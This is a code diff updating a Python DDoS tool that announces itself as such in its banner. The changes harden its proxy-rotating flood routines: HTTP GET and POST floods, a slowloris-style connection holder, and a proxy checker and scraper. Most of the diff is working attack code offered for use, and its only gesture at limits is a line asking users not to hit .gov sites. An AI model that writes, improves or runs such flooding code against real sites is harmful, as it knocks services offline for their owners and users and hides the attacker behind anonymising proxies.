@@ -17,7 +17,6 @@ import random
 import threading
 import sys
 import ssl
-import urllib.request
 
 
 print ('''
@@ -28,7 +27,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.0 (Improvement)
+Python3 version 3.1 (Fixed)
                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
@@ -196,6 +195,7 @@ referers = [
 	"https://www.bing.com/search?q=",
 	"https://r.search.yahoo.com/",
 ]
+
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
@@ -211,10 +211,13 @@ def cc(socks_type):
 		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
 		try:
 			proxy = random.choice(proxies).strip().split(":")
-			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			try:#dirty fix
+				if socks_type == 4:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			except:
+				continue
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -256,10 +259,13 @@ def post(socks_type):
 	while True:
 		try:
 			proxy = random.choice(proxies).strip().split(":")
-			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			try:#dirty fix
+				if socks_type == 4:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			except:
+				continue
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -284,10 +290,14 @@ def post(socks_type):
 socket_list=[]
 def slow(conn,socks_type):
 	proxy = random.choice(proxies).strip().split(":")
-	if socks_type == 4:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-	if socks_type == 5:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	try:#dirty fix
+		if socks_type == 4:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	except:
+		print("[!] Something wrong in socks list")
+		slow(conn,socks_type)#restart
 	for _ in range(conn):
 		try:
 			s = socks.socksocket()
@@ -355,10 +365,14 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
-	if socks_type == 4:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-	if socks_type == 5:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	try:#dirty fix
+		if socks_type == 4:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	except:
+		proxies.remove(lines)
+		return
 	err = 0
 	while True:
 		if err == 3:
@@ -485,6 +499,7 @@ def main():
 				except:
 					f.close()
 				try:#credit to All3xJ
+					import urllib.request
 					req = urllib.request.Request("https://www.socks-proxy.net/")
 					req.add_header("User-Agent", random.choice(useragents))
 					sourcecode = urllib.request.urlopen(req)
@@ -581,6 +596,7 @@ def main():
 			except:
 				f.close()
 			try:#credit to All3xJ
+				import urllib.request
 				req = urllib.request.Request("https://www.socks-proxy.net/")
 				req.add_header("User-Agent", random.choice(useragents))
 				sourcecode = urllib.request.urlopen(req)
